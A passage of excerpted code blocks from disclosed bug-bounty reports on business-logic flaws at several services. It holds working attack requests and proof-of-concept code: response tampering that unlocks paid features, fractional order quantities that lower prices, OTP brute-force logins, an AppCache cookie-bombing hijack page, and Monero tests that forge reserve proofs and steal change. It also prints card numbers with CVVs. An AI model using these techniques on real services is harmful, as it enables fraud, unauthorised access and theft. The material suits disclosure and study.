Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 142
Origin: null
Connection: close
Upgrade-Insecure-Requests: 1

email=victimattack%40gmail.com&requesttoken=Cdt30n8l%2FBhsd0fTp4wDDyvOvA26umsBZgymNLTrJWI%3D%3AZL8W4SURzVcIIAm06cNxOlm5jUrP1QloEW3RWO2SQQA%3D
```

```
HTTP/1.1 200 OK
Date: Sat, 03 Oct 2020 11:58:21 GMT
Server: Apache/2.4.29 (Ubuntu)
Strict-Transport-Security: max-age=15552000; includeSubDomains; preload
Referrer-Policy: no-referrer
X-Content-Type-Options: nosniff
X-Download-Options: noopen
X-Frame-Options: SAMEORIGIN
X-Permitted-Cross-Domain-Policies: none
X-Robots-Tag: none
X-XSS-Protection: 1; mode=block
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 13400
Connection: close
Content-Type: text/html; charset=UTF-8
```

## #1070510 Manipulating response leads to free access to Streamlabs Prime  — logitech — - — Business Logic Errors
Source: `hackerone/reports/2021/1070510.md` (https://hackerone.com/reports/1070510)

```
{
  "is_active": false,
  "is_pending": false,
  "is_past_due": false,
  "is_canceled": false,
  "is_pro": false,
  "type": "",
  "free_trial_claimed": false,
  "hibernate_claimed": false,
  "free_trial_eligible": false,
  "hibernate_eligible": false,
  "cooldown_eligible": false,
  "cooldown_seconds_past": null
}
```

```
1st.
Type: Response Body
Match: false
Replace: true
```

```
2nd.
Type: Response Body
Match: "blocked":true
Replace: "blocked":false
```

## #403783 [www.zomato.com] Tampering with Order Quantity and paying less amount then actual amount, leads to business loss — eternal — - — Business Logic Errors
Source: `hackerone/reports/2018/403783.md` (https://hackerone.com/reports/403783)

```
POST /php/o2_handler.php HTTP/1.1
Host: www.zomato.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.zomato.com/
content-type: application/x-www-form-urlencoded;charset=UTF-8
origin: https://www.zomato.com
Content-Length: 825
Cookie: <redacted>
Connection: close

████████&order%5Bdishes%5D%5B0%5D%5Btype%5D=dish&order%5Bdishes%5D%5B0%5D%5Bcomment%5D=&order%5Bdishes%5D%5B0%5D%5Bitem_id%5D=481238585&order%5Bdishes%5D%5B0%5D%5Bitem_name%5D=Veg%20Biryani%20%5BRegular%5D&order%5Bdishes%5D%5B0%5D%5Bmrp_item%5D=0&order%5Bdishes%5D%5B0%5D%5Bquantity%5D=1&order%5Bdishes%5D%5B0%5D%5Btags%5D=1&order%5Bdishes%5D%5B0%5D%5Btax_inclusive%5D=0&order%5Bdishes%5D%5B0%5D%5Bunit_cost%5D=120&order%5Bdishes%5D%5B0%5D%5Btotal_cost%5D=120&order%5Bdishes%5D%5B0%5D%5Bis_bogo_active%5D=false&order%5Bdishes%5D%5B0%5D%5BbogoItemsCount%5D=0&order%5Bdishes%5D%5B0%5D%5BalwaysShowOnCheckout%5D=0&order%5Bdishes%5D%5B0%5D%5Bduration_id%5D=0&res_id=███████&address_id=██████&voucher_code=&payment_method_type=&payment_method_id=0&card_bin=&case=calculatecart&csrfToken=███████
```

```
POST /php/o2_handler.php HTTP/1.1
Host: www.zomato.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.zomato.com/
content-type: application/x-www-form-urlencoded;charset=UTF-8
origin: https://www.zomato.com
Content-Length: 2444
Cookie: <redacted>
Connection: close

case=makeonlineorder&res_id=█████████&order={"charges":[{"item_name":"Delivery Charge","total_cost":10,"type":"charge","unit_cost":0,"quantity":0,"comment":null,"groups":[],"item_id":0,"mrp_item":0,"tax_inclusive":0,"tags":"","tax_id":0,"id":96623,"display_cost":"â¹10"}],"taxes":[{"item_name":"Taxes","total_cost":0.6,"type":"tax","unit_cost":0,"quantity":0,"comment":null,"groups":[],"item_id":0,"mrp_item":0,"tax_inclusive":0,"tags":"","tax_id":0,"id":0,"display_cost":"â¹0.60"}],"subtotal2":[{"item_name":"Subtotal","total_cost":12,"type":"subtotal2","unit_cost":0,"quantity":0,"comment":null,"groups":[],"item_id":0,"mrp_item":0,"tax_inclusive":0,"tags":"","tax_id":0,"id":0,"display_cost":"â¹12.00"}],"total":[{"item_name":"Grand Total","total_cost":"22.60","type":"total","unit_cost":0,"quantity":0,"comment":null,"groups":[],"item_id":0,"mrp_item":0,"tax_inclusive":0,"tags":"","tax_id":0,"id":0,"display_cost":"â¹22.60"}],"dishes":[{"type":"dish","comment":"","groups":[],"item_id":481238585,"item_name":"Veg Biryani [Regular]","mrp_item":0,"quantity":0.1,"tags":"1","
```

```
POST /php/o2_handler.php HTTP/1.1
Host: www.zomato.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.zomato.com/
content-type: application/x-www-form-urlencoded;charset=UTF-8
origin: https://www.zomato.com
Content-Length: 2444
Cookie: <redacted>
Connection: close

case=makeonlineorder&res_id=█████████&order={"charges":[{"item_name":"Delivery Charge","total_cost":10,"type":"charge","unit_cost":0,"quantity":0,"comment":null,"groups":[],"item_id":0,"mrp_item":0,"tax_inclusive":0,"tags":"","tax_id":0,"id":96623,"display_cost":"â¹10"}],"taxes":[{"item_name":"Taxes","total_cost":0.6,"type":"tax","unit_cost":0,"quantity":0,"comment":null,"groups":[],"item_id":0,"mrp_item":0,"tax_inclusive":0,"tags":"","tax_id":0,"id":0,"display_cost":"â¹0.60"}],"subtotal2":[{"item_name":"Subtotal","total_cost":12,"type":"subtotal2","unit_cost":0,"quantity":0,"comment":null,"groups":[],"item_id":0,"mrp_item":0,"tax_inclusive":0,"tags":"","tax_id":0,"id":0,"display_cost":"â¹12.00"}],"total":[{"item_name":"Grand Total","total_cost":"22.60","type":"total","unit_cost":0,"qua
```

## #3591764 Business Logic Bypass Allows Setting “Read Access” Role Without Pro Plan Subscription — lovable-vdp — - — Business Logic Errors
Source: `hackerone/reports/2026/3591764.md` (https://hackerone.com/reports/3591764)

```
POST /projects/Project-ID/magic-codes HTTP/2
Host: api.lovable.dev
Cookie: [Your-Cookie]
User-Agent: []
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://lovable.dev/
Authorization: Bearer [Your-Authorization-Header]
Content-Type: application/json
Content-Length: 23
Origin: https://lovable.dev
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
Priority: u=0
Te: trailers

{"access_level":"read"}
```

## #3426839 Unlimited Reuse of Coupon Code Allows Free Shipping on All Orders on ██████████ — aws_vdp — - — Business Logic Errors
Source: `hackerone/reports/2026/3426839.md` (https://hackerone.com/reports/3426839)

```
Free Shipping Promo Code (pick one):
United ████: ████████
International: ███
```

## #422331 attacker can book unlimited tickets in free at https://aaf.com/checkout/order-received/21237/?key=wc_order_5bbef48fa35b2 — aaf — - — Business Logic Errors
Source: `hackerone/reports/2019/422331.md` (https://hackerone.com/reports/422331)

```
Content-Disposition: form-data; name="addon-268-number-of-seats-0"

10-seats-10
```

## #1029027 Bypass subscription — imgur — - — Business Logic Errors
Source: `hackerone/reports/2020/1029027.md` (https://hackerone.com/reports/1029027)

```
:method: GET
:authority: api.imgur.com
:scheme: https
:path: /account/v1/accounts/me/avatars?client_id=YOU CLIENT ID
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
dnt: 1
accept: */*
origin: https://imgur.com
sec-fetch-site: same-site
sec-fetch-mode: cors
sec-fetch-dest: empty
referer: https://imgur.com/
accept-encoding: gzip, deflate, br
accept-language: ru,en-US;q=0.9,en;q=0.8,uk;q=0.7
YOU COOKIE
```

```
:method: PATCH
:authority: api.imgur.com
:scheme: https
:path: /account/v1/accounts/me?client_id=YOU CLIENT ID
accept: application/vnd.imgur.v1+json
dnt: 1
user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
content-type: application/vnd.imgur.v1+json
origin: https://imgur.com
sec-fetch-site: same-site
sec-fetch-mode: cors
sec-fetch-dest: empty
referer: https://imgur.com/
accept-encoding: gzip, deflate, br
accept-language: ru,en-US;q=0.9,en;q=0.8,uk;q=0.7
YOU COOKIE

Content-Length: 73

{
	"avatar_id": " subscription/spooktober-pumpkin", 
	"id": YOU ID
}
 
```

## #3599470 Improper input validation in emoji field leads to sidebar UI denial of service — nextcloud — - — Business Logic Errors
Source: `hackerone/reports/2026/3599470.md` (https://hackerone.com/reports/3599470)

```
PUT /ocs/v2.php/apps/collectives/api/v1.0/p/collectives/{collective_id}/pages/{page_id}/emoji
Content-Type: application/json

Example payload:

{
  "emoji": "👍aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
}
```

## #1991376 the domain is truck-admin.eu-east-1.indriverapp.com and Enter the management system of the blasting mobile phone verification code — indrive — - — Business Logic Errors
Source: `hackerone/reports/2023/1991376.md` (https://hackerone.com/reports/1991376)

```
POST /proxy/truck/api/admin/login HTTP/2
Host: truck-admin.eu-east-1.indriverapp.com
Cookie: _gcl_au=1.1.354145541.1684380001; _ga=GA1.1.1412822094.1684380001; _ga_YBFM6LW448=GS1.1.1684382089.2.1.1684382341.58.0.0
Content-Length: 37
Sec-Ch-Ua: "Chromium";v="21", " Not;A Brand";v="99"
Accept: application/json, text/plain, */*
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Origin: https://truck-admin.eu-east-1.indriverapp.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://truck-admin.eu-east-1.indriverapp.com/admin/auth
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

{"phone":"██████","code":"1234"}
 
```

```
POST /proxy/truck/api/admin/login HTTP/2
Host: truck-admin.eu-east-1.indriverapp.com
Cookie: _gcl_au=1.1.354145541.1684380001; _ga=GA1.1.1412822094.1684380001; _ga_YBFM6LW448=GS1.1.1684382089.2.1.1684382341.58.0.0
Content-Length: 37
Sec-Ch-Ua: "Chromium";v="21", " Not;A Brand";v="99"
Accept: application/json, text/plain, */*
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Origin: https://truck-admin.eu-east-1.indriverapp.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://truck-admin.eu-east-1.indriverapp.com/admin/auth
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

{"phone":"██████","code":"1234"}
```

## #403602 Attachments may be hijacked via AppCache+CookieBombing trick (bc3_production_blobs bucket) — basecamp — - — Business Logic Errors
Source: `hackerone/reports/2020/403602.md` (https://hackerone.com/reports/403602)

```
<html manifest="[manifest_url]">
This is the test page for a PoC. Now if you send any request in this bucket it will be hijacked.
<script>
setTimeout(function(){
for(var i = 1e3; i>0; i--){document.cookie = i + '=' + Array(4e3).join('0') + '; path=/'};
}, 3000);
</script>
</html>
```

```
CACHE MANIFEST 

FALLBACK:
/bc3_production_blobs/ [fallback_url]
```

```
<html>
<script>
alert('Your request to the page '+location.href+' is hijacked!');
</script>
</html>
```

## #637267 Payment method token being sent to 3rd party analytics service — upserve — - — Business Logic Errors
Source: `hackerone/reports/2021/637267.md` (https://hackerone.com/reports/637267)

```
{F523795}


##Reproduction Steps

1.) Create 2 Accounts on https://app.upserve.com/s/upserve-lounge-test-providence-2
 * juandelacruz@gmail.com
 * juandoe@gmail.com

2.) Add a Credit Card
 * 4834422077410033|01|2023|730  - for juandelacruz@gmail.com
 * 4834422073330870|06|2024|582 - juandoe@gmail.com

3.) While Adding the Credit Cards, Make sure to Capture all Request.

4.) Remove the Credit Card linked to the account of juandoe@gmail.com

5.) Using the payment_method_token of juandelacruz@gmail.com we will link his credit card to the account of juandoe@gmail.com

6.) Your Credit Card Will be linked to the account of juandoe@gmail.com.


I am Confused:
* The 
```

## #2213366 captcha bypass leads to register multiple user with one valid captcha — tennessee-valley-authority — - — Business Logic Errors
Source: `hackerone/reports/2023/2213366.md` (https://hackerone.com/reports/2213366)

```
POST /registration HTTP/2
Host: valleyconnect.tva.gov

UserName=admin&Password=jgn%25%5EThgf%23rfvHRESdy56tef&ConfirmPassword=jgn%25%5EThgf%23rfvHRESdy56tef&EmailAddress=E%40jetamooz.com&EmailAddressVerify=E%40jetamooz.com&FirstName=alex&LastName=jane&Initials=&Suffix=&JobTitle=it&OrganizationType=Business+Partner&OrganizationName=sarv&Country=792&StreetAddress=sary&City=katy&Province=titi&State=AL&ZipCode=&PhoneNumber=%28934%29+734-4364&MobilePhoneNumber=%28957%29+363-4655&TimeZone=America%2FLos_Angeles&CapAnswer=U4YIQ&CapKey=XXTxVOUWZrCz6buVtsgF2cFaPHLSCKVSRQc4z4My13Bee8JiTYVZXmiPd8zLSbMc&BeCheck=
```

## #2764830 CVE-2024-9681: HSTS subdomain overwrites parent cache entry — curl — - — Business Logic Errors
Source: `hackerone/reports/2024/2764830.md` (https://hackerone.com/reports/2764830)

```
.domain.com "20241107 01:02:03"
.sub.domain.com "unlimited"
```

```
.domain.com "unlimited"
.sub.domain.com "20250408 00:26:19"
```

```
.com "20241108 01:02:03"
.badssl.com "20260408 04:39:00"
```

## #220774 API Last Request Date/Time Not Updating — security — - — Business Logic Errors
Source: `hackerone/reports/2019/220774.md` (https://hackerone.com/reports/220774)

```
In the POC here, you can see that I've received notifications that my API user has performed actions via my notifications popup but the last request remains 
```

## #3699522 `check_reserve_proof` counts duplicate entries: one output can inflate `total` — monero — - — Business Logic Errors
Source: `hackerone/reports/2026/3699522.md` (https://hackerone.com/reports/3699522)

```
std::string prefix_data = message;
prefix_data.append((const char*)&address, sizeof(cryptonote::account_public_address));
for (size_t i = 0; i < proofs.size(); ++i)
  prefix_data.append((const char*)&proofs[i].key_image, sizeof(crypto::key_image));
crypto::hash prefix_hash;
crypto::cn_fast_hash(prefix_data.data(), prefix_data.size(), prefix_hash);
```

```
for (size_t i = 0; i < proofs.size(); ++i)
{
  // ... fetch tx, verify proofs, derive output ...
  total += amount;
  if (kispent_res.spent_status[i])
    spent += amount;
}
```

```
TEST(reserve_proof, duplicateKeyImagesReuseValidEntrySignatures)
{
  constexpr size_t duplicate_count = 3;
  constexpr int reserve_proof_version = 2;
  const std::string message = "unit-test-duplicate-ki-reserve-proof";

  cryptonote::account_base account;
  account.generate();
  const cryptonote::account_keys &keys = account.get_keys();
  std::unordered_map<crypto::public_key, cryptonote::subaddress_index> subaddresses;
  subaddresses[keys.m_account_address.m_spend_public_key] = {0, 0};

  crypto::public_key tx_pub;
  crypto::secret_key tx_sec;
  crypto::generate_keys(tx_pub, tx_sec, tx_sec, false);

  crypto::key_derivation recv_derivation;
  ASSERT_TRUE(keys.get_device().generate_key_derivation(tx_pub, keys.m_view_secret_key, recv_derivation));

  crypto::public_key out_pub;
  ASSERT_TRUE(crypto::derive_public_key(recv_derivation, 0, keys.m_account_address.m_spend_public_key, out_pub));

  cryptonote::keypair ephemeral;
  crypto::key_image ki;
  ASSERT_TRUE(cryptonote::generate_key_image_helper(keys, subaddresses, out_pub, tx_pub, {}, 0, ephemeral, ki, keys.get_device()));

  const crypto::public_key shared_secret =
      rct::rct2pk(rct::scalarmultKey(rct::pk2rct(tx_pub), rct::sk2rct(keys.m_view_secret_key)));

  std::string prefix_data = message;
  prefix_data.append((const char *)&keys.m_account_address, sizeof(cryptonote::account_public_address));
  for (size_t i = 0; i < duplicate_count; ++i)
    prefix_data.append((const char *)&ki, sizeof(crypto::key_image));
  cryp
```

## #1675674 An Attacker Can Flag Draft Job Posts And Can Disclose The Draft Job Posts Details [ Similar to #1581528 Resolved Report] — linkedin — - — Business Logic Errors
Source: `hackerone/reports/2023/1675674.md` (https://hackerone.com/reports/1675674)

```
2) Open any draft job  
```

```
3) Report the posted job and intercept the vulnerable request.
██████████
4) Forward the job using the draft jobid- █████. The report will get submitted without any error 
███
5) After some time, the attacker receives the notification from Trust and Safety Team ( We’ve reviewed your report) . Disclosing the job details of the job posts.
█████████

## Vulnerable Request:
```

```
POST /lite/flag-content?contentUrn=urn:li:jobPosting:██████████&reason=SPAM_CONTENT&contentSource=JOBS_PREMIUM_OFFLINE&authorProfileId=0&trk=report-content HTTP/2
Host: www.linkedin.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:103.0) Gecko/20100101 Firefox/103.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Csrf-Token: ajax:███
X-Isajaxform: 1
Origin: https://www.linkedin.com
Referer: https://www.linkedin.com/jobs/search/?currentJobId=████████
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Content-Length: 0
Te: trailers
'''

## Impact
```

## #3621588 Authenticated `unsigned_txset` change spoof lets a malicious hot wallet steal cold-signer change — monero — - — Business Logic Errors
Source: `hackerone/reports/2026/3621588.md` (https://hackerone.com/reports/3621588)

```
// tests/unit_tests/cold_signing_change_spoof.cpp
// unrelated include directives omitted for brevity

namespace
{
constexpr char k_unsigned_tx_prefix[] = "Monero unsigned tx set\005";

std::string dump_unsigned_txset_with_view_key(
    const tools::wallet2::unsigned_tx_set &unsigned_txs,
    const crypto::secret_key &view_secret_key,
    uint64_t kdf_rounds = 1)
{
  std::ostringstream oss;
  binary_archive<true> ar(oss);
  tools::wallet2::unsigned_tx_set copy = unsigned_txs;

  try
  {
    if (!::serialization::serialize(ar, copy))
      return {};
  }
  catch (...)
  {
    return {};
  }

  crypto::chacha_key key;
  crypto::generate_chacha_key(&view_secret_key, sizeof(view_secret_key), key, kdf_rounds);

  std::string ciphertext;
  crypto::chacha_iv iv = crypto::rand<crypto::chacha_iv>();
  ciphertext.resize(oss.str().size() + sizeof(iv) + sizeof(crypto::signature));
  crypto::chacha20(oss.str().data(), oss.str().size(), key, iv, &ciphertext[sizeof(iv)]);
  std::memcpy(&ciphertext[0], &iv, sizeof(iv));

  crypto::hash hash;
  crypto::cn_fast_hash(ciphertext.data(), ciphertext.size() - sizeof(crypto::signature), hash);
  crypto::public_key view_public_key;
  crypto::secret_key_to_public_key(view_secret_key, view_public_key);
  crypto::signature &signature =
      *reinterpret_cast<crypto::signature *>(&ciphertext[ciphertext.size() - sizeof(crypto::signature)]);
  crypto::generate_signature(hash, view_public_key, view_secret_key, signature);

  return std::string(k_unsigned_t
```

```
./build-audit-run/tests/unit_tests/unit_tests --gtest_filter='cold_signing_change_spoof.*'
```

```
Note: Google Test filter = cold_signing_change_spoof.*
[==========] Running 2 tests from 1 test suite.
[----------] Global test environment set-up.
[----------] 2 tests from cold_signing_change_spoof
[ RUN      ] cold_signing_change_spoof.hybrid_change_address_is_attacker_spendable
[step 1] Parsed hybrid address with victim view key and attacker spend key
[step 2] Generated change-classified output for the hybrid address
[step 3] Derived shared secret using the victim view secret key
[step 4] Output public key matches attacker spend path
[step 5] Attacker can derive the one-time spend key for the forged change output
[step 6] Victim spend key does not recover the forged change output
[       OK ] cold_signing_change_spoof.hybrid_change_address_is_attacker_spendable (0 ms)
[ RUN      ] cold_signing_change_spoof.forged_unsigned_txset_roundtrip_signs_attacker_change
[roundtrip prep 0] Generated victim and recipient accounts
[roundtrip prep 0b] Initialized builder, signer, and hot wallets
[roundtrip prep 0c] Built standard-genesis synthetic chain and rewound spendable blocks
[roundtrip prep 1] Imported synthetic outputs into the builder wallet
[roundtrip prep 1b] Builder wallet now tracks 311 imported transfer(s)
[roundtrip prep 2] Selected 5 owned transfer(s) totaling 7592169267200
[roundtrip prep 3] Builder wallet produced a legitimate pending_tx with wallet-owned sources
2026-03-22 18:57:03.865	W saving 1 transactions
[roundtrip prep 4] Exported the legitimate pending_tx into 
```

## #3734992 Schannel custom-CA path skips Extended Key Usage enforcement — curl — - — Business Logic Errors
Source: `hackerone/reports/2026/3734992.md` (https://hackerone.com/reports/3734992)

```
CERT_CHAIN_PARA ChainPara;

memset(&ChainPara, 0, sizeof(ChainPara));
ChainPara.cbSize = sizeof(ChainPara);

if(!CertGetCertificateChain(cert_chain_engine,
                            pCertContextServer,
                            NULL,
                            pCertContextServer->hCertStore,
                            &ChainPara,
                            (ssl_config->no_revoke ? 0 :
                             CERT_CHAIN_REVOCATION_CHECK_CHAIN),
                            NULL,
                            &pChainContext)) {
```

```
# CA key and self-signed certificate
openssl genrsa -out ca.key 2048
openssl req -new -x509 -days 3650 -key ca.key -out ca.pem \
    -subj "/CN=Test CA"

# Server key and CSR
openssl genrsa -out server.key 2048
openssl req -new -key server.key -out server.csr \
    -subj "/CN=server.example.com"

# Extension file: SAN + clientAuth EKU only
cat > server_exts.cnf << 'EOF'
subjectAltName   = DNS:server.example.com
extendedKeyUsage = clientAuth
EOF

# Sign the server cert with the CA
openssl x509 -req -days 365 -in server.csr \
    -CA ca.pem -CAkey ca.key -CAcreateserial \
    -extfile server_exts.cnf \
    -out server.pem

# Confirm: should show clientAuth and not serverAuth
openssl x509 -in server.pem -noout -text | grep -A3 "Extended Key"
```

```
curl --cacert ca.pem https://server.example.com/
```

## #672487 Business Logic Flaw - A non premium user can change/update retailers to get cashback on all the retailers associated with Curve — curve — - — Business Logic Errors
Source: `hackerone/reports/2020/672487.md` (https://hackerone.com/reports/672487)

```
GET /v1/rewards/users/programs/e329e463-7f5d-4358-9109-4f97c9f86abd/merchants HTTP/1.1
Accept: application/json
Curve-UserAgent: Android;Genymotion;Custom Phone
Curve-AppAndVersion: Curve Android 2.9.0
crv-user-agent: Android 2.9.0/20900
Authorization: APE7kg446BXw2iFEI6Ca079RaGrJ3bcelA9DKDoUFUA
crv-idempotency-key: a161ccfc-077c-4099-a180-ebbbacb50da6
crv-request-id: 88fb2296-46f4-49e4-858f-8aff312a9587
crv-correlation-id: android-98600fe2-6b09-48d8-94b1-cecf73094c43
Host: api.imaginecurve.com
Connection: close
Accept-Encoding: gzip, deflate
User-Agent: okhttp/3.12.2
```

```
HTTP/1.1 200 OK
Date: Tue, 13 Aug 2019 14:55:30 GMT
Content-Type: application/json
Connection: close
server: envoy
cache-control: no-cache, private
set-cookie: device_view=full; expires=Fri, 13-Sep-2019 14:55:30 GMT; Max-Age=2678400; path=/; HttpOnly
x-envoy-upstream-service-time: 48
Content-Length: 734

{"success":true,"data":{"merchants":[{"id":"7603f8b7-407c-4234-9153-7fe3b29863ed","name":"Waitrose","alias":"waitrose","hidden":false,"countries":["GBR"],"category":{"id":"0856b35f-ea59-479a-8f25-b70772d39dc8","name":"Groceries","curve_category_id":10},"percentage":1},{"id":"ca6daefd-f772-4286-9d70-504b094a98b8","name":"Whole Foods","alias":"wholefoods","hidden":false,"countries":["GBR"],"category":{"id":"0856b35f-ea59-479a-8f25-b70772d39dc8","name":"Groceries","curve_category_id":10},"percentage":1},{"id":"efb47f27-d905-4047-889c-f4da68e5a9b3","name":"Tesco","alias":"tesco","hidden":false,"countries":["GBR"],"category":{"id":"0856b35f-ea59-479a-8f25-b70772d39dc8","name":"Groceries","curve_category_id":10},"percentage":1}]}}
```

```
{"success":true,"data":{"merchants":[]}}
```

## #1691603 A Unverified User Can Post Newsletter (Which Is Not Allowed Through Application UI) — linkedin — - — Business Logic Errors
Source: `hackerone/reports/2023/1691603.md` (https://hackerone.com/reports/1691603)

```
and also there is no option to create the Newsletter in the application UI.
██████
But if we directly send the below request with the unverified user cookie ..it will be possible to create a new Newsletter.
```

```
## Steps :
1) Sign up for an account on Linkedin
2) Without verifying the email, jump directly to the URL : https://www.linkedin.com/post/new/ to write an article 
3) It can be seen that there is no option to create a  Newsletter. 
██████████
4) Now Login into the account where the Email is verified and try to create a newsletter.
████████
5) Click on Done and capture the vulnerable request and replay the request with the unverified user cookies.
and the newsletter will be successfully created.
████████

## Vulnerable Request 
```

```
POST /voyager/api/publishing/contentSeries HTTP/2
Host: www.linkedin.com
Cookie: xxx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: application/vnd.linkedin.normalized+json+2.1
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Li-Lang: en_US
X-Li-Track: {"clientVersion":"1.11.265","mpVersion":"1.11.265","osName":"web","timezoneOffset":5.5,"timezone":"Asia/Kolkata","deviceFormFactor":"DESKTOP","mpName":"voyager-web","displayDensity":1,"displayWidth":1440,"displayHeight":900}
X-Li-Page-Instance: urn:li:page:d_flagship3_publishing_post_edit;███████
Csrf-Token: ajax:████
X-Restli-Protocol-Version: 2.0.0
X-Li-Pem-Metadata: Voyager - Article Creator=create-series-model
Content-Type: application/json; charset=utf-8
Content-Length: 185
Origin: https://www.linkedin.com
Dnt: 1
Referer: https://www.linkedin.com/post/edit/███
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{"title":"dfghjk","description":"dgfhjkcgvhbjnkm","publishFrequency":{"duration":2,"unit":"MONTH"},"inviteTargetAudiences":true,"logoUrn":"urn:li:digitalmediaAsset:█████"}
```

